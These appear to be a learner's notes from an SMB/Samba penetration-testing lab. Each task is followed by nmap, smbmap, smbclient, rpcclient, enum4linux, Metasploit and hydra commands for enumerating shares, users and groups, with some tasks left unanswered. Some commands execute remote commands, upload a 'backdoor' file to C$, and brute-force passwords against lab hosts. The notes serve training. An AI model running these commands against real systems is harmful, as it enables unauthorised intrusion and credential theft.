# Identify SMB Protocol Dialects
Basically tells us SMB version used, as if its default then its dangerous
`nmap --script smb-protocols 10.5.16.60 -p 445 `

# Find SMB security level information
Tells us the account used without auth like guest, and also the other risks related to it like message signing disabled etc
`nmap --script smb-security-mode 10.5.16.60 -p 445 `

# Enumerate active users sessions, shares, Windows users, domains, services, etc.
Tells us about the users
`nmap --script smb-enum-users 10.5.21.157 -p 445`
`nmap --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`

Tells us the the information about active sessions
`nmap --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.5.21.157 -p 445`

Tells us the network shares basially list them and the details related to access, type etc
`nmap -p445 --script smb-enum-shares 10.5.21.157`

Tells us the network shares basially list them and access(read/write), type etc which is not given without authentication
`nmap --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`

Tells us the content inside the shares, basically list directores/files in listed shares
`nmap --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.31.241`

Tells us about the statestics info like Failed logins, permission errors and files opened
`nmap --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`

Tells us about domains, we observe misconfigirations like account lockout disabled, passwords min age and lenght not configured
`nmap --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`

Tells us about groups, we observe bob is in admin group giving him admin powers
`nmap --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`

# Enumerate samba server shares using smbmap
Tells us the shares/directories their access(read/write) details without authentication
`smbmap -u guest -p "" -d .  -H 10.5.26.125`

Tells us the shares/directories their access(read/write) details which are not given without authentication
`smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125`

# Have Remote code execution using smbmap
Gives us remote code execution however requires authentication
`smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -x 'ipconfig'`

# List the content of a share drive using smbmap
Gives us list of dir and files inside the particular share
`smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -r 'C$'`

# Upload file from machine to netowork share using smbmap
Allows us to upload file from our machine to network share
`smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H 10.5.24.17`

# Download file from a networt share drive to your machine using smbmap
Allows us to download file from share drive
`smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H 10.5.24.17`

# Find the default tcp ports used by samba smbd.
Tell us the open tcp ports
`nmap 192.213.18.3`

# Find the default udp ports used by nmbd.
Tells us the open udp ports
`nmap --top-port 25 -sU --open 192.213.18.3`

# What is the workgroup name of samba server?
Tells the version and service details on ports, which reveals the workgroup that host belongs to
`nmap 192.213.18.3 -sV`
`nmap --top-port 25 -sU --open 192.213.18.3 -sV`

# Find the exact version of samba server by using appropriate nmap script.
Tells us detailed info of OS using smb, providing OS name and version, Netbios name, computer name
`nmap 192.213.18.3 -sV`
`nmap --top-port 25 -sU --open 192.213.18.3 -sV`

# Find the exact version of samba server by using smb_version metasploit module.
Tells us the version details which we found in nmap using metasploit module

msf5 > `use auxiliary/scanner/smb/smb_version`
msf5 auxiliary(scanner/smb/smb_version) > `set rhosts 192.213.18.3`
msf5 auxiliary(scanner/smb/smb_version) > `run` OR msf5 auxiliary(scanner/smb/smb_version) > `exploit`

# What is the NetBIOS computer name of samba server? Use appropriate nmap scripts.
Tells us detailed info of OS using smb, providing OS name and version, Netbios name, computer name
`nmap -p 445 192.213.18.3 --script smb-os-discovery`

# Find the NetBIOS computer name of samba server using nmblookup
Tells us the computer name and suffix code using NetBIOS
`nmblookup -A 192.221.150.3`

# Using smbclient determine whether anonymous connection (null session)  is allowed on the samba server or not.
Lets us connect to SMB, in this case allowd to connect anonymously using guest account which has password not required misconfiguration
`smbclient -L 192.221.150.3`

# Using rpcclient determine whether anonymous connection (null session) is allowed on the samba server or not
Lets us connect using RPC anonymously without username and password
`rpcclient -U "" -N 192.230.148.3`

# Find the OS version of samba server using rpcclient.
Tells us OS version
root@attackdefense:~# `rpcclient -U "" -N 192.230.148.3`
rpcclient $> srvinfo

# Find the OS version of samba server using enum4Linux.
Tells us Os version 
`enum4linux -O 192.54.223.3 -p 445`

# Find the server description of samba server using smbclient.
Tells us server desc


# Is NT LM 0.12 (SMBv1) dialects supported by the samba server? Use appropriate nmap script.
Tells us the smbversion in dialects
`nmap --script smb-protocols 10.5.16.60 -p 445 `

# Is SMB2 protocol supported by the samba server? Use smb2 metasploit module.
Tells us if Samba server supports SMB2 protocol
msf5 > `use auxiliary/scanner/smb/smb2`
msf5 auxiliary(scanner/smb/smb_enumshares) > `set rhosts 192.157.202.3`
msf5 auxiliary(scanner/smb/smb_enumshares) > `run`

# List all users that exists on the samba server  using appropriate nmap script.
`nmap --script smb-enum-users --script-args smbusername=admin,smbpassword=password1 192.157.202.3`

# List all users that exists on the samba server  using smb_enumusers metasploit modules.
msf5 > `use auxiliary/scanner/smb/smb_enumusers`
msf5 auxiliary(scanner/smb/smb_enumshares) > `set rhosts 192.157.202.3`
msf5 auxiliary(scanner/smb/smb_enumshares) > `run`

# List all users that exists on the samba server  using enum4Linux.
`enum4linux -U 192.54.223.3 -p 445`

# List all users that exists on the samba server  using rpcclient.
`rpcclient -U "" -N 192.54.223.3`
rpcclient $> `enumdomusers`  

# Find SID of user “admin” using rpcclient.
root@attackdefense:~# `rpcclient -U "" -N 192.54.223.3`
rpcclient $> `lookupnames admin`

# List all available shares on the samba server using Nmap script.
`nmap --script smb-enum-shares -script-args smbusername=admin,smbpassword=password1 192.54.233.3`

# List all available shares on the samba server using smb_enumshares Metasploit module.
msf5 > `use auxiliary/scanner/smb/smb_enumshares`
msf5 auxiliary(scanner/smb/smb_enumshares) > `set rhosts 192.157.202.3`
msf5 auxiliary(scanner/smb/smb_enumshares) > `run`

# List all available shares on the samba server using enum4Linux.
`enum4linux -S  192.120.159.3`

# List all available shares on the samba server using smbclient.
`smbclient -L 192.221.150.3`

# Find domain groups that exist on the samba server by using enum4Linux.
`enum4linux -G  192.120.159.3`

# Find domain groups that exist on the samba server by using rpcclient.
root@attackdefense:~# `rpcclient -U "" -N 192.120.159.3`
rpcclient $> enumdomgroups

# Is samba server configured for printing?
`enum4linux -I  192.120.159.3`

# How many directories are present inside share “public”?
root@attackdefense:~# `smbclient //192.120.159.3/public - N`
smb: \> `ls`

# Fetch the flag from samba server.
root@attackdefense:~# `smbclient //192.120.159.3/public - N`
smb: \> `ls`
smb: \> `cd secret`
smb: \secret\> `get flag`

# What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt

msf5 > `use auxiliary/scanner/smb/smb_login`
msf5 auxiliary(scanner/smb/smb_login) > `set rhosts 192.253.104.3`
msf5 auxiliary(scanner/smb/smb_login) > `options`
msf5 auxiliary(scanner/smb/smb_login) > `set smbuser jane`
msf5 auxiliary(scanner/smb/smb_login) > `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt`
msf5 auxiliary(scanner/smb/smb_login) > `run`

# What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt
root@attackdefense:/# `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.241.81.3 smb`

# Which share is read only? Use smbmap with credentials obtained in question 2.


# Is share “jane” browseable? Use credentials obtained from the 1st question.

# Fetch the flag from share “admin”
root@attackdefense:/# `smbclient //192.241.81.3/admin -U admin`
smb: \> `ls`
smb: \> `cd hidden`
smb: \hidden\> `ls`
smb: \hidden\> `get flag.tar.gz `
smb: \hidden\> `exit`
root@attackdefense:/# `gzip -d flag.tar.gz `
root@attackdefense:/# `cat flag.tar` 

# List the named pipes available over SMB on the samba server? Use  pipe_auditor metasploit module with credentials obtained from question 2.
msf5 > `use auxiliary/scanner/smb/pipe_auditor`
msf5 auxiliary(scanner/smb/pipe_auditor) > `set smbuser admin`
msf5 auxiliary(scanner/smb/pipe_auditor) > `set smbpass password1`
msf5 auxiliary(scanner/smb/pipe_auditor) > `set rhosts 192.241.81.3`
msf5 auxiliary(scanner/smb/pipe_auditor) > `run`

# List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling  using enum4Linux with credentials obtained in question 2.
root@attackdefense:/# `enum4linux -r -u "admin" -p "password1" 192.241.81.3`